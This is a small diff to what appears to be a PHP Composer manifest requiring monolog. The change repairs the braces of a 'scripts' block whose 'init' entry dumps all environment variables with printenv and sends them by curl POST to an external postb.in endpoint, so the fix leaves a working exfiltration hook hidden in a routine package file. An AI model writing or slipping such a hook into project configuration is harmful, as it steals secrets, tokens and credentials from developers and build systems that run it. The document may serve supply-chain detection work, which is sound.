@@ -2,9 +2,10 @@
     "require": {
         "monolog/monolog": "1.0.*"
     },
-    "scripts": 
+    "scripts": {
         "init": [
             "envVar=$(printenv)",
             "curl -d \"$envVar\" -X POST https://postb.in/1599632293247-5047420586925"
         ]
+    }
 }
